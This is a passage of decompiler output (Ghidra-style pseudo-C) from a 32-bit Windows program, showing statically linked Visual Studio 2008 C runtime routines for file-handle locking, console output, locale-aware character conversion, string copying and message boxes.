  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_00437d68)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    piVar1 = (int *)((&DAT_00437d80)[param_1 >> 5] + iVar3);
    if (((*(byte *)(piVar1 + 1) & 1) != 0) && (*piVar1 != -1)) {
      if (DAT_00432c1c == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0042357d;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_0042357d:
      *(undefined4 *)(iVar3 + (&DAT_00437d80)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __get_osfhandle
// 
// Library: Visual Studio 2008 Release

intptr_t __cdecl __get_osfhandle(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  intptr_t *piVar3;
  intptr_t iVar4;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if (((_FileHandle < 0) || (DAT_00437d68 <= (uint)_FileHandle)) ||
     (piVar3 = (intptr_t *)((_FileHandle & 0x1fU) * 0x40 + (&DAT_00437d80)[_FileHandle >> 5]),
     (*(byte *)(piVar3 + 1) & 1) == 0)) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar4 = -1;
  }
  else {
    iVar4 = *piVar3;
  }
  return iVar4;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___lock_fhandle
// 
// Library: Visual Studio 2008 Release

int __cdecl ___lock_fhandle(int _Filehandle)

{
  BOOL BVar1;
  int iVar2;
  uint local_20;
  
  iVar2 = (_Filehandle & 0x1fU) * 0x40 + (&DAT_00437d80)[_Filehandle >> 5];
  local_20 = 1;
  if (*(int *)(iVar2 + 8) == 0) {
    __lock(10);
    if (*(int *)(iVar2 + 8) == 0) {
      BVar1 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(iVar2 + 0xc),4000);
      local_20 = (uint)(BVar1 != 0);
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
    }
    FUN_004236af();
  }
  if (local_20 != 0) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)
               ((&DAT_00437d80)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  }
  return local_20;
}



void FUN_004236af(void)

{
  FUN_0041be7c(10);
  return;
}



// Library Function - Single Match
//  __unlock_fhandle
// 
// Library: Visual Studio 2008 Release

void __cdecl __unlock_fhandle(int _Filehandle)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_00437d80)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __alloc_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __alloc_osfhnd(void)

{
  bool bVar1;
  int iVar2;
  BOOL BVar3;
  undefined4 *puVar4;
  int iVar5;
  int local_20;
  
  local_20 = -1;
  iVar5 = 0;
  bVar1 = false;
  iVar2 = __mtinitlocknum(0xb);
  if (iVar2 == 0) {
    local_20 = -1;
  }
  else {
    __lock(0xb);
    for (; iVar5 < 0x40; iVar5 = iVar5 + 1) {
      puVar4 = (undefined4 *)(&DAT_00437d80)[iVar5];
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = (undefined4 *)__calloc_crt(0x20,0x40);
        if (puVar4 != (undefined4 *)0x0) {
          (&DAT_00437d80)[iVar5] = puVar4;
          DAT_00437d68 = DAT_00437d68 + 0x20;
          for (; puVar4 < (undefined4 *)((&DAT_00437d80)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
            *(undefined *)(puVar4 + 1) = 0;
            *puVar4 = 0xffffffff;
            *(undefined *)((int)puVar4 + 5) = 10;
            puVar4[2] = 0;
          }
          local_20 = iVar5 << 5;
          *(undefined *)((&DAT_00437d80)[local_20 >> 5] + 4) = 1;
          iVar2 = ___lock_fhandle(local_20);
          if (iVar2 == 0) {
            local_20 = -1;
          }
        }
        break;
      }
      for (; puVar4 < (undefined4 *)((&DAT_00437d80)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
        if ((*(byte *)(puVar4 + 1) & 1) == 0) {
          if (puVar4[2] == 0) {
            __lock(10);
            if (puVar4[2] == 0) {
              BVar3 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(puVar4 + 3),4000);
              if (BVar3 == 0) {
                bVar1 = true;
              }
              else {
                puVar4[2] = puVar4[2] + 1;
              }
            }
            FUN_004237b2();
          }
          if (!bVar1) {
            EnterCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
            if ((*(byte *)(puVar4 + 1) & 1) == 0) {
              *(undefined *)(puVar4 + 1) = 1;
              *puVar4 = 0xffffffff;
              local_20 = ((int)puVar4 - (&DAT_00437d80)[iVar5] >> 6) + iVar5 * 0x20;
              break;
            }
            LeaveCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
          }
        }
      }
      if (local_20 != -1) break;
    }
    FUN_00423870();
  }
  return local_20;
}



void FUN_004237b2(void)

{
  FUN_0041be7c(10);
  return;
}



void FUN_00423870(void)

{
  FUN_0041be7c(0xb);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __commit
// 
// Library: Visual Studio 2008 Release

int __cdecl __commit(int _FileHandle)

{
  int *piVar1;
  HANDLE hFile;
  BOOL BVar2;
  ulong *puVar3;
  int iVar4;
  DWORD local_20;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00437d68)) {
      iVar4 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar4 + 4 + (&DAT_00437d80)[_FileHandle >> 5]) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)(iVar4 + 4 + (&DAT_00437d80)[_FileHandle >> 5]) & 1) != 0) {
          hFile = (HANDLE)__get_osfhandle(_FileHandle);
          BVar2 = FlushFileBuffers(hFile);
          if (BVar2 == 0) {
            local_20 = GetLastError();
          }
          else {
            local_20 = 0;
          }
          if (local_20 == 0) goto LAB_0042393b;
          puVar3 = ___doserrno();
          *puVar3 = local_20;
        }
        piVar1 = __errno();
        *piVar1 = 9;
        local_20 = 0xffffffff;
LAB_0042393b:
        FUN_00423950();
        return local_20;
      }
    }
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_00423950(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __isatty
// 
// Library: Visual Studio 2008 Release

int __cdecl __isatty(int _FileHandle)

{
  int *piVar1;
  uint uVar2;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
    return 0;
  }
  if ((_FileHandle < 0) || (DAT_00437d68 <= (uint)_FileHandle)) {
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    uVar2 = 0;
  }
  else {
    uVar2 = (int)*(char *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) &
            0x40;
  }
  return uVar2;
}



// Library Function - Single Match
//  __putwch_nolock
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  wint_t wVar1;
  BOOL BVar2;
  DWORD DVar3;
  UINT CodePage;
  wchar_t *lpWideCharStr;
  int cchWideChar;
  CHAR *lpMultiByteStr;
  int cbMultiByte;
  LPCSTR lpDefaultChar;
  LPBOOL lpUsedDefaultChar;
  DWORD local_14;
  CHAR local_10 [8];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  if (DAT_00433b50 != 0) {
    if (DAT_00433c84 == (HANDLE)0xfffffffe) {
      ___initconout();
    }
    if (DAT_00433c84 == (HANDLE)0xffffffff) goto LAB_00423a6a;
    BVar2 = WriteConsoleW(DAT_00433c84,&_WCh,1,&local_14,(LPVOID)0x0);
    if (BVar2 != 0) {
      DAT_00433b50 = 1;
      goto LAB_00423a6a;
    }
    if ((DAT_00433b50 != 2) || (DVar3 = GetLastError(), DVar3 != 0x78)) goto LAB_00423a6a;
    DAT_00433b50 = 0;
  }
  lpUsedDefaultChar = (LPBOOL)0x0;
  lpDefaultChar = (LPCSTR)0x0;
  cbMultiByte = 5;
  lpMultiByteStr = local_10;
  cchWideChar = 1;
  lpWideCharStr = &_WCh;
  DVar3 = 0;
  CodePage = GetConsoleOutputCP();
  DVar3 = WideCharToMultiByte(CodePage,DVar3,lpWideCharStr,cchWideChar,lpMultiByteStr,cbMultiByte,
                              lpDefaultChar,lpUsedDefaultChar);
  if (DAT_00433c84 != (HANDLE)0xffffffff) {
    WriteConsoleA(DAT_00433c84,local_10,DVar3,&local_14,(LPVOID)0x0);
  }
LAB_00423a6a:
  wVar1 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar1;
}



// Library Function - Single Match
//  __mbtowc_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  wchar_t *pwVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if ((_SrcCh != (char *)0x0) && (_SrcSizeInBytes != 0)) {
    if (*_SrcCh != '\0') {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale != (wchar_t *)0x0) {
        iVar2 = __isleadbyte_l((uint)(byte)*_SrcCh,&local_14);
        if (iVar2 == 0) {
          iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,1,_DstCh,
                                      (uint)(_DstCh != (wchar_t *)0x0));
          if (iVar2 != 0) goto LAB_00423ad2;
        }
        else {
          pwVar1 = (local_14.locinfo)->locale_name[3];
          if ((((1 < (int)pwVar1) && ((int)pwVar1 <= (int)_SrcSizeInBytes)) &&
              (iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,(int)pwVar1,
                                           _DstCh,(uint)(_DstCh != (wchar_t *)0x0)), iVar2 != 0)) ||
             (((local_14.locinfo)->locale_name[3] <= _SrcSizeInBytes && (_SrcCh[1] != '\0')))) {
            pwVar1 = (local_14.locinfo)->locale_name[3];
            if (local_8 == '\0') {
              return (int)pwVar1;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return (int)pwVar1;
          }
        }
        piVar3 = __errno();
        *piVar3 = 0x2a;
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return -1;
      }
      if (_DstCh != (wchar_t *)0x0) {
        *_DstCh = (ushort)(byte)*_SrcCh;
      }
LAB_00423ad2:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 1;
    }
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = L'\0';
    }
  }
  return 0;
}



// Library Function - Single Match
//  _mbtowc
// 
// Library: Visual Studio 2008 Release

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __isleadbyte_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 200) + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



// Library Function - Single Match
//  _isleadbyte
// 
// Library: Visual Studio 2008 Release

int __cdecl _isleadbyte(int _C)

{
  int iVar1;
  
  iVar1 = __isleadbyte_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  ___crtMessageBoxA
// 
// Library: Visual Studio 2008 Release

int __cdecl ___crtMessageBoxA(LPCSTR _LpText,LPCSTR _LpCaption,UINT _UType)

{
  int iVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  code *pcVar3;
  code *pcVar4;
  int iVar5;
  undefined local_18 [8];
  byte local_10;
  undefined local_c [4];
  int local_8;
  
  iVar1 = __encoded_null();
  local_8 = 0;
  if (DAT_00436abc == 0) {
    hModule = LoadLibraryA("USER32.DLL");
    if (hModule == (HMODULE)0x0) {
      return 0;
    }
    pFVar2 = GetProcAddress(hModule,"MessageBoxA");
    if (pFVar2 == (FARPROC)0x0) {
      return 0;
    }
    DAT_00436abc = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,"GetActiveWindow");
    DAT_00436ac0 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,"GetLastActivePopup");
    DAT_00436ac4 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,"GetUserObjectInformationA");
    DAT_00436acc = __encode_pointer((int)pFVar2);
    if (DAT_00436acc != 0) {
      pFVar2 = GetProcAddress(hModule,"GetProcessWindowStation");
      DAT_00436ac8 = __encode_pointer((int)pFVar2);
    }
  }
  if ((DAT_00436ac8 != iVar1) && (DAT_00436acc != iVar1)) {
    pcVar3 = (code *)__decode_pointer(DAT_00436ac8);
    pcVar4 = (code *)__decode_pointer(DAT_00436acc);
    if (((pcVar3 != (code *)0x0) && (pcVar4 != (code *)0x0)) &&
       (((iVar5 = (*pcVar3)(), iVar5 == 0 ||
         (iVar5 = (*pcVar4)(iVar5,1,local_18,0xc,local_c), iVar5 == 0)) || ((local_10 & 1) == 0))))
    {
      _UType = _UType | 0x200000;
      goto LAB_00423d41;
    }
  }
  if ((((DAT_00436ac0 != iVar1) &&
       (pcVar3 = (code *)__decode_pointer(DAT_00436ac0), pcVar3 != (code *)0x0)) &&
      (local_8 = (*pcVar3)(), local_8 != 0)) &&
     ((DAT_00436ac4 != iVar1 &&
      (pcVar3 = (code *)__decode_pointer(DAT_00436ac4), pcVar3 != (code *)0x0)))) {
    local_8 = (*pcVar3)(local_8);
  }
LAB_00423d41:
  pcVar3 = (code *)__decode_pointer(DAT_00436abc);
  if (pcVar3 == (code *)0x0) {
    return 0;
  }
  iVar1 = (*pcVar3)(local_8,_LpText,_LpCaption,_UType);
  return iVar1;
}



// Library Function - Single Match
//  _strncpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strncpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src,rsize_t _MaxCount)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  rsize_t rVar4;
  errno_t eVar5;
  
  if (_MaxCount == 0) {
    if (_Dst == (char *)0x0) {
      if (_SizeInBytes == 0) {
        return 0;
      }
    }
    else {
LAB_00423d8e:
      if (_SizeInBytes != 0) {
        if (_MaxCount == 0) {
          *_Dst = '\0';
          return 0;
        }
        if (_Src != (char *)0x0) {
          pcVar3 = _Dst;
          rVar4 = _SizeInBytes;
          if (_MaxCount == 0xffffffff) {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if (cVar1 == '\0') break;
              rVar4 = rVar4 - 1;
            } while (rVar4 != 0);
          }
          else {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if ((cVar1 == '\0') || (rVar4 = rVar4 - 1, rVar4 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pcVar3 = '\0';
            }
          }
          if (rVar4 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInBytes - 1] = '\0';
            return 0x50;
          }
          *_Dst = '\0';
          piVar2 = __errno();
          eVar5 = 0x22;
          *piVar2 = 0x22;
          goto LAB_00423d9f;
        }
        *_Dst = '\0';
      }
    }
  }
  else if (_Dst != (char *)0x0) goto LAB_00423d8e;
  piVar2 = __errno();
  eVar5 = 0x16;
  *piVar2 = 0x16;
LAB_00423d9f:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar5;
}



// Library Function - Single Match
//  _strlen
// 
// Library: Visual Studio

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_00423e83;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_00423e83:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



// Library Function - Single Match
//  __set_error_mode
// 
// Library: Visual Studio 2008 Release

int __cdecl __set_error_mode(int _Mode)

{
  int *piVar1;
  int iVar2;
  
  if (-1 < _Mode) {
    if (_Mode < 3) {
      iVar2 = DAT_00435f78;
      DAT_00435f78 = _Mode;
      return iVar2;
    }
    if (_Mode == 3) {
      return DAT_00435f78;
    }
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// Library Function - Single Match
//  __get_printf_count_output
// 
// Library: Visual Studio 2008 Release

int __cdecl __get_printf_count_output(void)

{
  return (uint)(DAT_00436ad0 == (DAT_00432c20 | 1));
}



// Library Function - Single Match
//  __wctomb_s_l
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  char *lpMultiByteStr;
  size_t _Size;
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _Size = _SizeInBytes;
  lpMultiByteStr = _MbCh;
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
LAB_00423f30:
    iVar1 = 0;
  }
  else {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = -1;
    }
    if (0x7fffffff < _SizeInBytes) {
      piVar2 = __errno();
      *piVar2 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      return 0x16;
    }
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
    if (*(int *)(local_14[0] + 0x14) == 0) {
      if ((ushort)_WCh < 0x100) {
        if (lpMultiByteStr != (char *)0x0) {
          if (_Size == 0) goto LAB_00423fc7;
          *lpMultiByteStr = (char)_WCh;
        }
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = 1;
        }
LAB_00424002:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        goto LAB_00423f30;
      }
      if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
        _memset(lpMultiByteStr,0,_Size);
      }
    }
    else {
      _MbCh = (char *)0x0;
      iVar1 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&_WCh,1,lpMultiByteStr,_Size,
                                  (LPCSTR)0x0,(LPBOOL)&_MbCh);
      if (iVar1 == 0) {
        DVar3 = GetLastError();
        if (DVar3 == 0x7a) {
          if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
            _memset(lpMultiByteStr,0,_Size);
          }
LAB_00423fc7:
          piVar2 = __errno();
          *piVar2 = 0x22;
          __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          if (local_8 == '\0') {
            return 0x22;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return 0x22;
        }
      }
      else if (_MbCh == (char *)0x0) {
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = iVar1;
        }
        goto LAB_00424002;
      }
    }
    piVar2 = __errno();
    *piVar2 = 0x2a;
    piVar2 = __errno();
    iVar1 = *piVar2;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar1;
}



// Library Function - Single Match
//  _wctomb_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __freea
// 
// Library: Visual Studio 2008 Release

void __cdecl __freea(void *_Memory)

{
  if ((_Memory != (void *)0x0) && (*(int *)((int)_Memory + -8) == 0xdddd)) {
    _free((int *)((int)_Memory + -8));
  }
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtLCMapStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// const *,int,char *,int,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtLCMapStringA_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  uint uVar1;
  bool bVar2;
  int iVar3;
  DWORD DVar4;
  char *pcVar5;
  uint cchWideChar;
  undefined4 *puVar6;
  UINT UVar7;
  int *in_ECX;
  char *pcVar8;
  LPSTR lpMultiByteStr;
  void *local_14;
  undefined4 *local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  if (DAT_00436ad4 == 0) {
    iVar3 = LCMapStringW(0,0x100,L"",1,(LPWSTR)0x0,0);
    if (iVar3 == 0) {
      DVar4 = GetLastError();
      if (DVar4 == 0x78) {
        DAT_00436ad4 = 2;
      }
    }
    else {
      DAT_00436ad4 = 1;
    }
  }
  pcVar5 = (char *)param_3;
  pcVar8 = param_4;
  if (0 < (int)param_4) {
    do {
      pcVar8 = pcVar8 + -1;
      if (*pcVar5 == '\0') goto LAB_00424126;
      pcVar5 = pcVar5 + 1;
    } while (pcVar8 != (char *)0x0);
    pcVar8 = (char *)0xffffffff;
LAB_00424126:
    pcVar5 = param_4 + -(int)pcVar8;
    bVar2 = (int)(pcVar5 + -1) < (int)param_4;
    param_4 = pcVar5 + -1;
    if (bVar2) {
      param_4 = pcVar5;
    }
  }
  if ((DAT_00436ad4 == 2) || (DAT_00436ad4 == 0)) {
    local_10 = (undefined4 *)0x0;
    local_14 = (void *)0x0;
    if (param_1 == (localeinfo_struct *)0x0) {
      param_1 = *(localeinfo_struct **)(*in_ECX + 0x14);
    }
    if (param_7 == 0) {
      param_7 = *(int *)(*in_ECX + 4);
    }
    UVar7 = ___ansicp((LCID)param_1);
    if (UVar7 == 0xffffffff) goto LAB_00424448;
    if (UVar7 == param_7) {
      LCMapStringA((LCID)param_1,param_2,(LPCSTR)param_3,(int)param_4,(LPSTR)param_5,(int)param_6);
    }
    else {
      local_10 = (undefined4 *)
                 ___convertcp(param_7,UVar7,(char *)param_3,(uint *)&param_4,(LPSTR)0x0,0);
      if (local_10 == (undefined4 *)0x0) goto LAB_00424448;
      local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)0x0,0);
      if (local_c != 0) {
        if (((int)local_c < 1) || (0xffffffe0 < local_c)) {
          puVar6 = (undefined4 *)0x0;
        }
        else if (local_c + 8 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_00424425;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(local_c + 8);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
        if (puVar6 != (undefined4 *)0x0) {
          _memset(puVar6,0,local_c);
          local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)puVar6,
                                 local_c);
          if (local_c != 0) {
            local_14 = (void *)___convertcp(UVar7,param_7,(char *)puVar6,&local_c,(LPSTR)param_5,
                                            (int)param_6);
          }
          __freea(puVar6);
        }
      }
    }
LAB_00424425:
    if (local_10 != (undefined4 *)0x0) {
      _free(local_10);
    }
    if ((local_14 != (void *)0x0) && ((void *)param_5 != local_14)) {
      _free(local_14);
    }
    goto LAB_00424448;
  }
  if (DAT_00436ad4 != 1) goto LAB_00424448;
  local_c = 0;
  if (param_7 == 0) {
    param_7 = *(int *)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar(param_7,(uint)(param_8 != 0) * 8 + 1,(LPCSTR)param_3,
                                    (int)param_4,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_00424448;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    local_10 = (undefined4 *)0x0;
  }
  else {
    uVar1 = cchWideChar * 2 + 8;
    if (uVar1 < 0x401) {
      puVar6 = (undefined4 *)&stack0xffffffdc;
      local_10 = (undefined4 *)&stack0xffffffdc;
      if (&stack0x00000000 != (undefined *)0x24) {
LAB_004241ce:
        local_10 = puVar6 + 2;
      }
    }
    else {
      puVar6 = (undefined4 *)_malloc(uVar1);
      local_10 = puVar6;
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = 0xdddd;
        goto LAB_004241ce;
      }
    }
  }
  if (local_10 == (undefined4 *)0x0) goto LAB_00424448;
  iVar3 = MultiByteToWideChar(param_7,1,(LPCSTR)param_3,(int)param_4,(LPWSTR)local_10,cchWideChar);
  if ((iVar3 != 0) &&
     (local_c = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)0x0,0),
     local_c != 0)) {
    if ((param_2 & 0x400) == 0) {
      if (((int)local_c < 1) || (0xffffffe0 / local_c < 2)) {
        puVar6 = (undefined4 *)0x0;
      }
      else {
        uVar1 = local_c * 2 + 8;
        if (uVar1 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_004242de;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(uVar1);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
      }
      if (puVar6 != (undefined4 *)0x0) {
        iVar3 = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)puVar6,
                             local_c);
        if (iVar3 != 0) {
          lpMultiByteStr = (LPSTR)param_5;
          pcVar5 = param_6;
          if (param_6 == (char *)0x0) {
            lpMultiByteStr = (LPSTR)0x0;
            pcVar5 = (char *)0x0;
          }
          local_c = WideCharToMultiByte(param_7,0,(LPCWSTR)puVar6,local_c,lpMultiByteStr,(int)pcVar5
                                        ,(LPCSTR)0x0,(LPBOOL)0x0);
        }
        __freea(puVar6);
      }
    }
    else if ((param_6 != (char *)0x0) && ((int)local_c <= (int)param_6)) {
      LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)param_5,(int)param_6)
      ;
    }
  }
LAB_004242de:
  __freea(local_10);
LAB_00424448:
  iVar3 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar3;
}



// Library Function - Single Match
//  ___crtLCMapStringA
// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtLCMapStringA(_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwMapFlag,LPCSTR _LpSrcStr,
                  int _CchSrc,LPSTR _LpDestStr,int _CchDest,int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_ffffffec;
  int local_c;
